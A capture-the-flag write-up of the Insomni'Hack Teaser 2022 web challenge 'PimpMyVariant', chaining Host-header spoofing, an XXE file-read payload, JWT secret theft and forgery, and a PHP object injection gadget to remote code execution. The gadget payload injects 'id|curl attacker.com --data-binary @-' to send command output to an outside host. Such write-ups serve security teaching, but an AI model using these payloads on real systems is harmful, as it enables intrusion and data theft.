# Insomni'Hack Teaser 2022 - PimpMyVariant
## Hostname spoofing - XXE - JWT Forgery - PHP Object Injection

> `We` means DANOZOPITO team, composed of pandawa, [VladRico](https://github.com/VladRico), Xartapz and [zM_](https://github.com/ZanyMonk).

We're presented a list of names, no button, no form. No interesting file referenced in the index.

After a quick recon we find a `robots.txt` that gives us some paths.

```
/readme    # "Hostname not allowed"
/new       # "Hostname not allowed"
/log       # "Access restricted to admin only"
/flag.txt  # "Try harder"
/todo.txt  # "test back"
```

We can spoof the hostname in our requests in order to access `/readme` and `/new` endpoints.

```
$ curl 'https://pimpmyvariant.insomnihack.ch/readme' -H 'Host: 127.0.0.1'
...
#DEBUG- JWT secret key can now be found in the /www/jwt.secret.txt file
```

The endpoint `/new` presents a form that seems to push "variant names" to some kind of data storage.

```js
document.getElementById('variant_form').onsubmit = function() {
	var variant_name = document.getElementById('variant_name').value;

	postData('/api', "<?xml version='1.0' encoding='utf-8'?><root><name>"+variant_name+"</name></root>").then(data => {
        window.location.href = '/';
    });

	return false;
}
```

A chunk of JS handles the form's submission to send some sort of SOAP-like request. That surely is a XXE vector.

The app does not appear to be using any server-side database to store user's data. In fact, it generates a JWT that contains all the variant names displayed on the index page, as well as a `settings` attribute which contains a serialized PHP class instance representing the `User` we're actually logged in as.

We can extract the content of `/www/jwt.secret.txt` with the following XXE:
```xml
<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///www/jwt.secret.txt'>]>
<root>
    <name>&test;</name>
</root>
```

The server responds with a JWT and a succes message:
```xml
HTTP/1.1 302 Found
Set-Cookie: jwt=eyJhbGciOiJIUzI1N...J9cjKrLRfXl3P6OhHtI8
<?xml version="1.0" encoding="utf-8"?>
<root>
    <sucess>Variant name added !</sucess>
</root>
```

```sh
$ jwt_tool eyJhbGciOiJIUzI1N...J9cjKrLRfXl3P6OhHtI8
...
Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] variants = ['Alpha', 'Beta', 'Gamma', 'Delta', 'Omicron', 'Lambda', 'Epsilon', 'Zeta', 'Eta', 'Theta', 'Iota', '54b163783c46881f1fe7ee05f90334aa']
[+] settings = "a:1:{i:0;O:4:"User":3:{s:4:"name";s:4:"Anon";s:7:"isAdmin";b:0;s:2:"id";s:40:"18ece0c0b1d80ce692437fb40d52b667dab4035b";}}"
[+] exp = 1643555234    ==> TIMESTAMP = 2022-01-30 16:07:14 (UTC)
```

We just retrieved the secret key used to sign JWTs: `54b163783c46881f1fe7ee05f90334aa`.

That enables us to forge any JWT we like, and therefore we can bypass `/log` access restriction by setting `User::isAdmin` property to `true`:

```diff
- a:1:{i:0;O:4:"User":3:{s:4:"name";s:4:"Anon";s:7:"isAdmin";b:0;s:2:"id";s:40:"ff9d2c6e893ca3b4886f26eb98c2bc06754def72";}}
+ a:1:{i:0;O:4:"User":3:{s:4:"name";s:4:"Anon";s:7:"isAdmin";b:1;s:2:"id";s:40:"ff9d2c6e893ca3b4886f26eb98c2bc06754def72";}}
```

```sh
$ jwt_tool.py -b 'eyJhbGciOiJIUzI1N...J9cjKrLRfXl3P6OhHtI8' \
-p 54b163783c46881f1fe7ee05f90334aa -S hs256 \
-I -pc settings \
   -pv 'a:1:{i:0;O:4:"User":3:{s:4:"name";s:4:"Anon";s:7:"isAdmin";b:1;s:2:"id";s:40:"18ece0c0b1d80ce692437fb40d52b667dab4035b";}}'

eyJhbGciOiJIUzI1NiIsInR5c...snpRnQZrbbrdValmu90
$ curl 'https://pimpmyvariant.insomnihack.ch/log' \
    -H 'Host: 127.0.0.1' \
    -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5c...snpRnQZrbbrdValmu90'
...
[2021-12-25 02:12:01] Fatal error: Uncaught Error: Bad system command call from UpdateLogViewer::read() from global scope in /www/log.php:36
Stack trace:
#0 {main}
  thrown in /www/log.php on line 37
#0 {UpdateLogViewer::read}
  thrown in /www/UpdateLogViewer.inc on line 26
```

Server's document root might be at `/www/` as `/www/log.php` seems to be accessible through `/log` endpoints. This is confirmed by hiting some paths from the `robots.txt` through the previous XXE exfiltration technique.

Fortunately the server kindly serves `/www/UpdateLogViewer.inc` as plaintext because of its extension, here it is (i added all the salty comments myself):
```php
<?php
class UpdateLogViewer
{
    public string $packgeName;
    public string $logCmdReader;
    private static ?UpdateLogViewer $singleton = null;
    
    // This method won't get called on unserialization, we can override any
    // of our instance's attributes, even add new ones
    //
    // Also note that we need to make it public in order to call it manually when
    // building our payload
    private function __construct(string $packgeName)
    {
        $this->packgeName = $packgeName;
        $this->logCmdReader = 'cat';
    }
    
    // This method gets called in /www/log.php, hopefully after our settings
    // get unserialized
    public static function instance() : UpdateLogViewer
    {
        if( !isset(self::$singleton) || self::$singleton === null ){
            $c = __CLASS__;
            self::$singleton = new $c("$c");
        }
        return self::$singleton;
    }
    
    // Because file reading functions do not exist in PHP
    public static function read():string
    {
        return system(self::logFile());
    }
    
    // Data does not come directly from the $_GET array, so it's fully safe not to
    // filter or escape anything
    public static function logFile():string
    {
        return self::instance()->logCmdReader.' /var/log/UpdateLogViewer_'.self::instance()->packgeName.'.log';
    }
    
    // This replaces the current $singleton instance by $this instance
    public function __wakeup()// serialize
    {
        self::$singleton = $this; 
    }
};
```

That is the ideal gadget to execute arbitrary system commands on the remote server.

By forging a new JWT with a specially crafted `settings` property containing not only an admin `User` instance, but also an `UpdateLogViewer` instance. Once `settings` array gets unserialized, the classes it contains are instanciated using `__wakeup()` method (`__construct()` is **not** executed during unserialization).

In our case, it replaces the current `$singleton` with our instance, that's perfect ! Thanks developer !

Let's forge our gadget:
```php
<?php
// Code seems safe (for us), so we don't bother and include it
include 'UpdateLogViewer.inc';

// We inject our command in a subshell, piping its result to a remote HTTP server
$instance = new UpdateLogViewer('UpdateLogViewer$(id|curl attacker.com --data-binary @-)');

// Print original serialized data + an extra attribute containing our UpdateLogViewer
// instance, and our payload !
echo 'a:1:{i:0;O:4:"User":4:{s:4:"name";s:4:"Anon";s:7:"isAdmin";b:1;s:2:"id";s:40:"ff9d2c6e893ca3b4886f26eb98c2bc06754def72";s:2:"me";' . serialize($instance) . ';}}';
```

```sh
$ ./gen.php
a:1:{i:0;O:4:"User":4:{s:4:"name";s:4:"Anon";s:7:"isAdmin";b:1;s:2:"id";s:40:"ff9d2c6e893ca3b4886f26eb98c2bc06754def72";s:2:"me";O:15:"UpdateLogViewer":2:{s:10:"packgeName";s:55:"UpdateLogViewer$(id|curl attacker.com --data-binary @-)";s:12:"logCmdReader";s:3:"cat";};}}

$ curl 'https://pimpmyvariant.insomnihack.ch/log' \
    -H 'Host: 127.0.0.1' \
    -H "Cookie: jwt=$( \
        jwt_tool -b 'eyJhbGciOiJIUzI1N...J9cjKrLRfXl3P6OhHtI8' \
            -p 54b163783c46881f1fe7ee05f90334aa -S hs256 \
            -I -pc settings -pv "$(./gen.php)" \
        )"
```

On our HTTP server we receive a `POST` request with the following body:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have a proper RCE ! Last step is to `cat /www/flag.txt` which gives us a nice ASCII art of a virus (and the flag, no kidding !).
